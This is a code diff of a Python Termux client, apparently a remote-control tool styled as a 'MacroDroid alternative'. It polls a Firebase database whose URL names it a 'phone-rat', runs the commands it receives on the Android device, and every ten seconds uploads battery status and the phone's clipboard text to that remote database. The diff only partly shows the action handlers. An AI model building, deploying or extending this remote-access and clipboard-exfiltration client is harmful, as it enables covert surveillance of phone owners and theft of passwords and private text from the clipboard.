@@ -2,6 +2,7 @@
 """
 MacroDroid Remote Alternative - Termux Client Node
 Developed by Osman Gani
+Compatible with Web Admin Panel & Firebase Realtime Database
 """
 
 import time
@@ -15,6 +16,7 @@ FIREBASE_DB_URL = "https://phone-rat-10a3d-default-rtdb.firebaseio.com"
 DEVICE_ID = "android_device_01"
 
 def run_cmd(args):
+    """Executes a termux-api shell command safely"""
     try:
         res = subprocess.run(args, capture_output=True, text=True, timeout=10)
         return res.stdout.strip()
@@ -22,6 +24,7 @@ def run_cmd(args):
         return ""
 
 def patch_firebase(path, data):
+    """Sends telemetry and ACK updates to Firebase"""
     url = f"{FIREBASE_DB_URL}/{path}.json"
     try:
         req = urllib.request.Request(
@@ -31,10 +34,11 @@ def patch_firebase(path, data):
             method='PATCH'
         )
         urllib.request.urlopen(req, timeout=8)
-    except Exception as e:
+    except Exception:
         pass
 
 def get_from_firebase(path):
+    """Reads incoming pending commands from Firebase"""
     url = f"{FIREBASE_DB_URL}/{path}.json"
     try:
         with urllib.request.urlopen(url, timeout=8) as res:
@@ -44,6 +48,7 @@ def get_from_firebase(path):
         return None
 
 def execute_action(action, payload):
+    """Executes the action on Android hardware via termux-api"""
     print(f"\n[⚡ COMMAND RECEIVED] {action} => {payload}")
     result = "Success"
     try:
@@ -91,22 +96,25 @@ def execute_action(action, payload):
             result = "Clipboard updated"
             
         elif action == "lock":
-            run_cmd(["termux-toast", "Lock Phone command received"])
+            run_cmd(["termux-toast", "Lock Screen triggered"])
             result = "Lock triggered"
+
+        else:
+            result = f"Action {action} handled"
             
     except Exception as e:
         result = f"Error: {e}"
 
-    # ড্যাশবোর্ডে অ্যাকনলেজ পাঠানো
+    # ড্যাশবোর্ডে অ্যাকনলেজ পাঠানো যাতে ওয়েব ড্যাশবোর্ডের Pulse অ্যানিমেশন স্টপ হয়
     patch_firebase(f"devices/{DEVICE_ID}/commands", {
         "status": "executed",
         "result": result,
         "executedAt": int(time.time() * 1000)
     })
-    print(f"[✔ EXECUTED] {result}")
+    print(f"[✔ EXECUTED & ACK SENT] {result}")
 
 def telemetry_worker():
-    """প্রতি ১০ সেকেন্ডে ফোনের ব্যাটারি ও স্ট্যাটাস পাঠায়"""
+    """প্রতি ১০ সেকেন্ডে ফোনের আসল ব্যাটারি, চার্জিং স্ট্যাটাস ও ক্লিপবোর্ড পাঠায়"""
     while True:
         try:
             bat_json = run_cmd(["termux-battery-status"])
@@ -117,24 +125,28 @@ def telemetry_worker():
             patch_firebase(f"devices/{DEVICE_ID}/status", {
                 "batteryLevel": pct,
                 "isCharging": plugged,
-                "networkType": "Termux Wi-Fi",
+                "networkType": "Termux (Android)",
                 "wifiSSID": "Active",
                 "lastSeen": int(time.time() * 1000),
                 "isOnline": True
             })
+
             clip = run_cmd(["termux-clipboard-get"])
             if clip:
-                patch_firebase(f"devices/{DEVICE_ID}/clipboard", {"text": clip})
+                patch_firebase(f"devices/{DEVICE_ID}/clipboard", {
+                    "text": clip,
+                    "updatedAt": int(time.time() * 1000)
+                })
         except Exception:
             pass
         time.sleep(10)
 
 def main():
-    print("=" * 55)
-    print("⚡ MacroDroid Alternative - Termux Client Active")
+    print("=" * 60)
+    print("⚡ MacroDroid Alternative - Termux Client Node Active")
     print(f"📡 Device ID : {DEVICE_ID}")
     print(f"🔥 Firebase  : {FIREBASE_DB_URL}")
-    print("=" * 55)
+    print("=" * 60)
     
     # টেলিমেট্রি ব্যাকগ্রাউন্ড থ্রেডে শুরু
     threading.Thread(target=telemetry_worker, daemon=True).start()
